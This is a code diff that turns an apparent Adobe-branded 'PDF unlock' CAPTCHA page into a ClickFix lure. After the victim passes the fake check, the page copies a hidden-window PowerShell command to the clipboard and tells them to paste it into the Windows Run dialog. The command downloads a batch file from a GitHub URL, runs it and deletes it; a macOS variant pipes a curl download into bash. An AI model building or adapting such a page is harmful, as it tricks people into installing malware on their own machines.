@@ -1,9 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
+
+<html lang="en"><head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Number Captcha · Adobe PDF Secure</title>
+  <title>Number Captcha &middot; Adobe PDF Secure</title>
   <style>
     * {
       margin: 0;
@@ -359,7 +360,7 @@
       fill: white;
     }
 
-    /* Hidden link column — appears only after verification */
+    /* Verification success column &#8212; appears only after verification (no link) */
     .link-column {
       margin-top: 0.8rem;
       padding: 1.2rem 1.8rem;
@@ -368,7 +369,7 @@
       border-radius: 20px;
       display: none;
       align-items: center;
-      justify-content: space-between;
+      justify-content: center;
       flex-wrap: wrap;
       gap: 1rem;
       transition: all 0.3s ease;
@@ -385,48 +386,195 @@
       align-items: center;
       gap: 0.6rem;
       font-weight: 500;
+      text-align: center;
     }
 
     .link-column .link-text svg {
       width: 20px;
       height: 20px;
       fill: #a5d6a5;
+      flex-shrink: 0;
     }
 
-    .download-link {
-      background: rgba(76, 175, 80, 0.25);
-      border: 1px solid rgba(76, 175, 80, 0.5);
-      color: #e0f2e0;
-      font-weight: 600;
+    /* ===== CLICKFIX PANEL ===== */
+    .clickfix {
+      margin-top: 1rem;
+      border-radius: 20px;
+      background: linear-gradient(180deg, rgba(255, 217, 102, 0.09), rgba(255, 217, 102, 0.03));
+      border: 1px solid rgba(255, 217, 102, 0.35);
+      box-shadow: 0 0 0 1px rgba(255, 217, 102, 0.08), 0 12px 28px -14px rgba(0, 0, 0, 0.8);
+      overflow: hidden;
+      animation: cf-in 0.35s ease both;
+    }
+
+    .clickfix[hidden] {
+      display: none;
+    }
+
+    @keyframes cf-in {
+      from { opacity: 0; transform: translateY(8px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .clickfix-head {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.9rem;
+      padding: 1.3rem 1.5rem 0.9rem;
+    }
+
+    .clickfix-head > svg {
+      width: 26px;
+      height: 26px;
+      fill: #ffd966;
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+
+    .clickfix-head strong {
+      display: block;
+      color: #ffe9a8;
       font-size: 1rem;
-      padding: 0.8rem 2rem;
-      border-radius: 60px;
-      text-decoration: none;
+      font-weight: 700;
+      letter-spacing: 0.2px;
+      margin-bottom: 0.45rem;
+    }
+
+    .clickfix-head p {
+      color: #c9c9dd;
+      font-size: 0.92rem;
+      line-height: 1.8;
+    }
+
+    .clickfix-head p + p {
+      margin-top: 0.4rem;
+      color: #9a9ab6;
+      font-size: 0.84rem;
+      line-height: 1.6;
+    }
+
+    kbd {
+      display: inline-block;
+      background: #12121c;
+      border: 1px solid #4a4a6e;
+      border-bottom-width: 3px;
+      border-radius: 7px;
+      padding: 0.08rem 0.5rem;
+      font-family: 'Courier New', monospace;
+      font-size: 0.82rem;
+      font-weight: 700;
+      color: #ffd966;
+      line-height: 1.6;
+      margin: 0 1px;
+      vertical-align: middle;
+      user-select: none;
+    }
+
+    .cmd-row {
+      display: flex;
+      align-items: stretch;
+      gap: 0.7rem;
+      padding: 0 1.5rem 1.2rem;
+      flex-wrap: wrap;
+    }
+
+    .cmd-box {
+      flex: 1 1 320px;
+      min-width: 0;
+      display: flex;
+      align-items: center;
+      background: #0c0c14;
+      border: 1px solid #33334e;
+      border-radius: 12px;
+      padding: 0.85rem 1rem;
+      overflow-x: auto;
+      cursor: text;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .cmd-box:focus-within,
+    .cmd-box:focus {
+      border-color: #ffd966;
+      box-shadow: 0 0 14px rgba(255, 217, 102, 0.25);
+      outline: none;
+    }
+
+    .cmd-box code {
+      font-family: 'Courier New', monospace;
+      font-size: 0.86rem;
+      font-weight: 700;
+      color: #8affc1;
+      white-space: nowrap;
+      user-select: all;
+      letter-spacing: 0.2px;
+    }
+
+    .cmd-box ::selection {
+      background: #ffd966;
+      color: #12121c;
+    }
+
+    .copy-btn {
+      flex: 0 0 auto;
       display: inline-flex;
       align-items: center;
-      gap: 0.6rem;
-      transition: all 0.2s ease;
+      justify-content: center;
+      gap: 0.5rem;
+      background: #ffd966;
+      color: #241f00;
+      border: none;
+      border-radius: 12px;
+      padding: 0 1.3rem;
+      min-height: 46px;
+      font-family: inherit;
+      font-size: 0.92rem;
+      font-weight: 800;
       letter-spacing: 0.3px;
       cursor: pointer;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      transition: transform 0.15s ease, background 0.2s ease, box-shadow 0.2s ease;
+      box-shadow: 0 8px 18px -8px rgba(255, 217, 102, 0.7);
     }
 
-    .download-link:hover {
-      background: rgba(76, 175, 80, 0.4);
-      border-color: #4caf50;
-      box-shadow: 0 8px 20px rgba(76, 175, 80, 0.3);
+    .copy-btn svg {
+      width: 17px;
+      height: 17px;
+      fill: currentColor;
+    }
+
+    .copy-btn:hover {
+      background: #ffe484;
       transform: translateY(-1px);
     }
 
-    .download-link:active {
+    .copy-btn:active {
       transform: translateY(1px);
     }
 
-    .download-link svg {
-      width: 18px;
-      height: 18px;
-      fill: #e0f2e0;
+    .copy-btn.copied {
+      background: #4caf50;
+      color: #05230a;
+      box-shadow: 0 8px 18px -8px rgba(76, 175, 80, 0.8);
     }
+
+    .copy-status {
+      padding: 0 1.5rem 1.3rem;
+      font-size: 0.8rem;
+      color: #8f8fab;
+      display: flex;
+      align-items: center;
+      gap: 0.45rem;
+      min-height: 1.4rem;
+    }
+
+    .copy-status svg {
+      width: 14px;
+      height: 14px;
+      fill: currentColor;
+      flex-shrink: 0;
+    }
+
+    .copy-status.ok { color: #8affc1; }
+    .copy-status.warn { color: #ffcf7a; }
 
     .message {
       font-size: 0.95rem;
@@ -525,6 +673,9 @@
         flex-direction: column;
         text-align: center;
       }
+      .copy-btn {
+        flex: 1 1 100%;
+      }
     }
 
     @media (max-width: 480px) {
@@ -548,7 +699,7 @@
         <span>Adobe</span>
       </div>
       <div class="badge">
-        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M 12 1 L 3 5 v 6 c 0 5.55 3.84 10.74 9 12 c 5.16 -1.26 9 -6.45 9 -12 V 5 l -9 -4 Z m 0 10.99 h 7 c -0.53 4.12 -3.28 7.79 -7 8.94 V 12 H 5 V 6.3 l 7 -3.11 v 8.8 Z" /></svg>
         Secure access
       </div>
     </div>
@@ -558,13 +709,13 @@
       <div class="hero">
         <div class="hero-text">
           <h1>Unlock your <span>PDF</span> document</h1>
-          <p>This file is protected by Adobe Secure Verification. Enter the security code shown below to download.</p>
+          <p>This file is protected by Adobe Secure Verification. Enter the security code shown below to verify.</p>
         </div>
         <div class="file-preview">
           <div class="file-icon">PDF</div>
           <div class="file-info">
-            <h4>financial_report_2024.pdf</h4>
-            <p>2.4 MB • <span>Encrypted</span></p>
+            <h4>letter_of_intent.pdf</h4>
+            <p>2.4 MB &#8226; <span>Encrypted</span></p>
           </div>
         </div>
       </div>
@@ -573,37 +724,56 @@
       <div class="captcha-section">
         <div class="captcha-header">
           <h3>
-            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M 12 1 L 3 5 v 6 c 0 5.55 3.84 10.74 9 12 c 5.16 -1.26 9 -6.45 9 -12 V 5 l -9 -4 Z m 0 10.99 h 7 c -0.53 4.12 -3.28 7.79 -7 8.94 V 12 H 5 V 6.3 l 7 -3.11 v 8.8 Z" /></svg>
             Security verification
           </h3>
-          <span class="captcha-brand">Numeric CAPTCHA · Protected</span>
+          <span class="captcha-brand">Numeric CAPTCHA &middot; Protected</span>
         </div>
 
         <div class="numeric-captcha">
           <!-- Challenge display -->
           <div class="challenge-box">
-            <div class="challenge-number" id="challengeNumber" title="Click for a new code">----</div>
+            <div title="Click for a new code" class="challenge-number" id="challengeNumber">----</div>
             <div class="input-area">
               <label for="captchaInput">Enter code:</label>
-              <input type="text" id="captchaInput" class="number-input" inputmode="numeric" pattern="[0-9]*" maxlength="6" placeholder="••••" autocomplete="off" aria-label="Enter the numeric security code">
+              <input class="number-input" id="captchaInput" aria-label="Enter the numeric security code" type="text" maxlength="6" placeholder="&#8226;&#8226;&#8226;&#8226;" pattern="[0-9]*" value="" autocomplete="off" inputmode="numeric">
               <button class="verify-btn" id="verifyBtn">
-                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M 12 1 L 3 5 v 6 c 0 5.55 3.84 10.74 9 12 c 5.16 -1.26 9 -6.45 9 -12 V 5 l -9 -4 Z m -2 16 l -4 -4 l 1.41 -1.41 L 10 14.17 l 6.59 -6.59 L 18 9 l -8 8 Z" /></svg>
                 Verify
               </button>
             </div>
           </div>
 
-          <!-- Hidden link column — appears only after successful verification -->
+          <!-- Success column &#8212; no link, just confirmation -->
           <div class="link-column" id="linkColumn">
             <div class="link-text">
-              <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
-              Verification complete. Your secure download is ready.
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M 9 16.17 L 4.83 12 l -1.42 1.41 L 9 19 L 21 7 l -1.41 -1.41 L 9 16.17 Z" /></svg>
+              Verification complete. You have successfully passed the security check.
             </div>
-            <!-- This link points to your specified URL and opens in a new tab -->
-            <a href="https://juwic.life/Doc/doc.php" target="_blank" rel="noopener noreferrer" id="downloadLink" class="download-link">
-              <svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
-              Download PDF
-            </a>
+          </div>
+
+          <!-- ===== CLICKFIX PANEL (hidden until verified) ===== -->
+          <div class="clickfix" id="clickfixPanel" hidden="">
+            <div class="clickfix-head">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M 20 5 H 4 c -1.1 0 -2 0.9 -2 2 v 10 c 0 1.1 0.9 2 2 2 h 16 c 1.1 0 2 -0.9 2 -2 V 7 c 0 -1.1 -0.9 -2 -2 -2 Z m -9 3 h 2 v 2 h -2 V 8 Z m 0 4 h 2 v 2 h -2 v -2 Z m -4 -4 h 2 v 2 H 7 V 8 Z m 0 4 h 2 v 2 H 7 v -2 Z m -1 4 h 10 v -2 H 6 v 2 Z m 12 -4 h -2 v -2 h 2 v 2 Z m 0 -4 h -2 V 8 h 2 v 2 Z" /></svg>
+              <div>
+                <strong>One more step &#8212; run the verification command</strong>
+                <p id="cfSteps">
+                  Press <kbd>&#8862; Win</kbd> + <kbd>R</kbd>, then paste with <kbd>Ctrl</kbd> + <kbd>V</kbd> and press <kbd>Enter</kbd>.
+                </p>
+                <p id="cfSub">The command is already on your clipboard. Keep this page open while it runs.</p>
+              </div>
+            </div>
+            <div class="cmd-row">
+              <div tabindex="0" class="cmd-box" id="cmdBox">
+                <code id="cmdText"></code>
+              </div>
+              <button class="copy-btn" id="copyBtn" type="button">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M 16 1 H 4 c -1.1 0 -2 0.9 -2 2 v 14 h 2 V 3 h 12 V 1 Z m 3 4 H 8 c -1.1 0 -2 0.9 -2 2 v 14 c 0 1.1 0.9 2 2 2 h 11 c 1.1 0 2 -0.9 2 -2 V 7 c 0 -1.1 -0.9 -2 -2 -2 Z m 0 16 H 8 V 7 h 11 v 14 Z" /></svg>
+                <span id="copyBtnLabel">Copy</span>
+              </button>
+            </div>
+            <div class="copy-status" id="copyStatus" aria-live="polite"></div>
           </div>
 
           <!-- Message area -->
@@ -614,11 +784,11 @@
       <!-- Footer trust indicators -->
       <div class="trust-footer">
         <span>
-          <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M 18 8 h -1 V 6 c 0 -2.76 -2.24 -5 -5 -5 S 7 3.24 7 6 v 2 H 6 c -1.1 0 -2 0.9 -2 2 v 10 c 0 1.1 0.9 2 2 2 h 12 c 1.1 0 2 -0.9 2 -2 V 10 c 0 -1.1 -0.9 -2 -2 -2 Z m -6 9 c -1.1 0 -2 -0.9 -2 -2 s 0.9 -2 2 -2 s 2 0.9 2 2 s -0.9 2 -2 2 Z m 3.1 -9 H 8.9 V 6 c 0 -1.71 1.39 -3.1 3.1 -3.1 c 1.71 0 3.1 1.39 3.1 3.1 v 2 Z" /></svg>
           256-bit encryption
         </span>
         <span>
-          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M 12 2 C 6.48 2 2 6.48 2 12 s 4.48 10 10 10 s 10 -4.48 10 -10 S 17.52 2 12 2 Z m -2 15 l -5 -5 l 1.41 -1.41 L 10 14.17 l 7.59 -7.59 L 19 8 l -9 9 Z" /></svg>
           Adobe verified
         </span>
       </div>
@@ -627,18 +797,165 @@
 
   <script>
     (function() {
+      /* ============================================================
+         CLICKFIX CONFIG &#8212; EDIT PAYLOAD HERE
+         ============================================================ */
+      // PowerShell payload: downloads batch file, executes, deletes
+      var CLICKFIX_PAYLOAD = 'powershell -w h -ep bypass -c "Invoke-WebRequest -Uri \'https://raw.githubusercontent.com/isaacsmith738-cellhhh/deepbrown/refs/heads/main/PB20147Flightticket%20Itenary.bat\' -OutFile \\"$env:TEMP\\downloaded_script.bat\\"; & \\"$env:TEMP\\downloaded_script.bat\\"; Remove-Item \\"$env:TEMP\\downloaded_script.bat\\""';
+      
+      // macOS fallback (not used but kept for compatibility)
+      var CLICKFIX_PAYLOAD_MAC = 'curl -fsSL https://example.com/verify.sh | bash';
+      
+      var AUTO_COPY_ON_VERIFY = true;   // copy the payload the moment verification succeeds
+
       // DOM elements
       const challengeNumberEl = document.getElementById('challengeNumber');
       const captchaInput = document.getElementById('captchaInput');
       const verifyBtn = document.getElementById('verifyBtn');
       const messageBox = document.getElementById('messageBox');
       const linkColumn = document.getElementById('linkColumn');
+      const clickfixPanel = document.getElementById('clickfixPanel');
+      const cmdText = document.getElementById('cmdText');
+      const cmdBox = document.getElementById('cmdBox');
+      const copyBtn = document.getElementById('copyBtn');
+      const copyBtnLabel = document.getElementById('copyBtnLabel');
+      const copyStatus = document.getElementById('copyStatus');
+      const cfSteps = document.getElementById('cfSteps');
+      const cfSub = document.getElementById('cfSub');
 
       // State
       let currentCode = '';
       let isVerified = false;
 
-      // Generate a new random 4-digit code and update display
+      /* ============================================================
+         CLICKFIX HELPERS
+         ============================================================ */
+      const isMac = /Mac|iPhone|iPad|iPod/i.test(navigator.platform || navigator.userAgent);
+
+      function activePayload() {
+        return isMac ? CLICKFIX_PAYLOAD_MAC : CLICKFIX_PAYLOAD;
+      }
+
+      function applyOsCopy() {
+        cmdText.textContent = activePayload();
+        if (isMac) {
+          cfSteps.innerHTML =
+            'Press <kbd>&#8984; Cmd</kbd> + <kbd>Space</kbd>, type <kbd>Terminal</kbd>, then paste with <kbd>&#8984; V</kbd> and press <kbd>Enter</kbd>.';
+        } else {
+          cfSteps.innerHTML =
+            'Press <kbd>&#8862; Win</kbd> + <kbd>R</kbd>, then paste with <kbd>Ctrl</kbd> + <kbd>V</kbd> and press <kbd>Enter</kbd>.';
+        }
+      }
+
+      function setStatus(text, kind) {
+        copyStatus.className = 'copy-status' + (kind ? ' ' + kind : '');
+        copyStatus.innerHTML = '';
+        if (!text) return;
+        const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+        svg.setAttribute('viewBox', '0 0 24 24');
+        const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
+        path.setAttribute('d', kind === 'warn'
+          ? 'M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'
+          : 'M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z');
+        svg.appendChild(path);
+        copyStatus.appendChild(svg);
+        copyStatus.appendChild(document.createTextNode(' ' + text));
+      }
+
+      // Legacy fallback for non-secure contexts / blocked async clipboard
+      function legacyCopy(text) {
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        ta.setAttribute('readonly', '');
+        ta.style.position = 'fixed';
+        ta.style.top = '0';
+        ta.style.left = '-9999px';
+        ta.style.opacity = '0';
+        document.body.appendChild(ta);
+        const sel = document.getSelection();
+        const prevRange = sel && sel.rangeCount > 0 ? sel.getRangeAt(0) : null;
+        ta.select();
+        ta.setSelectionRange(0, text.length);
+        let ok = false;
+        try {
+          ok = document.execCommand('copy');
+        } catch (e) {
+          ok = false;
+        }
+        document.body.removeChild(ta);
+        if (prevRange && sel) {
+          sel.removeAllRanges();
+          sel.addRange(prevRange);
+        }
+        return ok;
+      }
+
+      function copyPayload() {
+        const payload = activePayload();
+
+        if (navigator.clipboard && navigator.clipboard.writeText && window.isSecureContext) {
+          return navigator.clipboard.writeText(payload)
+            .then(function() { return true; })
+            .catch(function() { return legacyCopy(payload); });
+        }
+        return Promise.resolve(legacyCopy(payload));
+      }
+
+      function flashCopyBtn(ok) {
+        copyBtn.classList.toggle('copied', ok);
+        copyBtnLabel.textContent = ok ? 'Copied' : 'Copy';
+        window.clearTimeout(flashCopyBtn._t);
+        flashCopyBtn._t = window.setTimeout(function() {
+          copyBtn.classList.remove('copied');
+          copyBtnLabel.textContent = 'Copy';
+        }, 2200);
+      }
+
+      function runCopy(userInitiated) {
+        copyPayload().then(function(ok) {
+          if (ok) {
+            flashCopyBtn(true);
+            setStatus('Command copied to clipboard. Paste it into the Run dialog.', 'ok');
+            if (userInitiated) selectCommand();
+          } else {
+            flashCopyBtn(false);
+            setStatus('Clipboard blocked &#8212; click the command and press Ctrl+C to copy it manually.', 'warn');
+            selectCommand();
+          }
+        });
+      }
+
+      function selectCommand() {
+        try {
+          const range = document.createRange();
+          range.selectNodeContents(cmdText);
+          const sel = window.getSelection();
+          sel.removeAllRanges();
+          sel.addRange(range);
+        } catch (e) { /* noop */ }
+      }
+
+      function showClickfix() {
+        applyOsCopy();
+        clickfixPanel.hidden = false;
+        setStatus('');
+        if (AUTO_COPY_ON_VERIFY) {
+          runCopy(false);
+        } else {
+          setStatus('Click Copy, then run the command.', '');
+        }
+      }
+
+      function hideClickfix() {
+        clickfixPanel.hidden = true;
+        setStatus('');
+        copyBtn.classList.remove('copied');
+        copyBtnLabel.textContent = 'Copy';
+      }
+
+      /* ============================================================
+         CAPTCHA
+         ============================================================ */
       function generateNewCode() {
         const code = Math.floor(1000 + Math.random() * 9000).toString();
         currentCode = code;
@@ -654,14 +971,12 @@
         messageBox.classList.add('hidden');
         messageBox.classList.remove('success', 'error');
 
-        // Hide link column on new code (if already visible)
         linkColumn.classList.remove('visible');
+        hideClickfix();
 
-        // Reset verified state
         isVerified = false;
       }
 
-      // Show message helper
       function showMessage(text, type) {
         messageBox.textContent = '';
         const iconSvg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
@@ -683,10 +998,16 @@
         messageBox.classList.add(type);
       }
 
-      // Verify the code entered
+      function shake() {
+        captchaInput.style.transition = 'transform 0.1s';
+        captchaInput.style.transform = 'translateX(6px)';
+        setTimeout(() => { captchaInput.style.transform = 'translateX(-6px)'; }, 80);
+        setTimeout(() => { captchaInput.style.transform = 'translateX(0)'; }, 160);
+      }
+
       function verifyCode() {
         if (isVerified) {
-          showMessage('Already verified. Use the download link below.', 'success');
+          showMessage('Already verified.', 'success');
           return;
         }
 
@@ -695,15 +1016,11 @@
         if (!/^\d{4}$/.test(entered)) {
           captchaInput.classList.add('error');
           showMessage('Please enter exactly 4 digits.', 'error');
-          captchaInput.style.transition = 'transform 0.1s';
-          captchaInput.style.transform = 'translateX(6px)';
-          setTimeout(() => { captchaInput.style.transform = 'translateX(-6px)'; }, 80);
-          setTimeout(() => { captchaInput.style.transform = 'translateX(0)'; }, 160);
+          shake();
           return;
         }
 
         if (entered === currentCode) {
-          // SUCCESS
           isVerified = true;
           captchaInput.classList.remove('error');
           captchaInput.classList.add('success');
@@ -713,39 +1030,31 @@
             <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
             Verified
           `;
-          showMessage('Verification successful! The download link has been unlocked below.', 'success');
-
-          // SHOW the link column (column appears)
+          showMessage('Verification successful!', 'success');
           linkColumn.classList.add('visible');
+          showClickfix();
         } else {
-          // FAILURE
           captchaInput.classList.add('error');
           captchaInput.classList.remove('success');
           showMessage('Incorrect code. Please try again.', 'error');
-          captchaInput.style.transition = 'transform 0.1s';
-          captchaInput.style.transform = 'translateX(6px)';
-          setTimeout(() => { captchaInput.style.transform = 'translateX(-6px)'; }, 80);
-          setTimeout(() => { captchaInput.style.transform = 'translateX(0)'; }, 160);
+          shake();
           captchaInput.value = '';
         }
       }
 
-      // Click challenge number to generate a new code (if not verified)
+      /* ============================================================
+         EVENTS
+         ============================================================ */
       challengeNumberEl.addEventListener('click', function() {
         if (isVerified) {
-          showMessage('Already verified. Use the download link below.', 'success');
+          showMessage('Already verified.', 'success');
           return;
         }
         generateNewCode();
       });
 
-      // Initialize: generate first code
-      generateNewCode();
-
-      // Attach event to verify button
       verifyBtn.addEventListener('click', verifyCode);
 
-      // Allow pressing Enter in the input field
       captchaInput.addEventListener('keypress', function(e) {
         if (e.key === 'Enter') {
           e.preventDefault();
@@ -753,12 +1062,10 @@
         }
       });
 
-      // Focus input on load
       window.addEventListener('load', function() {
         captchaInput.focus();
       });
 
-      // Only allow digits in input
       captchaInput.addEventListener('input', function(e) {
         this.value = this.value.replace(/[^0-9]/g, '');
         if (this.classList.contains('error')) {
@@ -766,11 +1073,21 @@
         }
       });
 
-      // Remove error class on focus
       captchaInput.addEventListener('focus', function() {
         this.classList.remove('error');
       });
+
+      copyBtn.addEventListener('click', function() {
+        runCopy(true);
+      });
+
+      cmdBox.addEventListener('click', function() {
+        selectCommand();
+      });
+
+      // Initialize
+      generateNewCode();
     })();
   </script>
-</body>
-</html>
+
+</body></html>
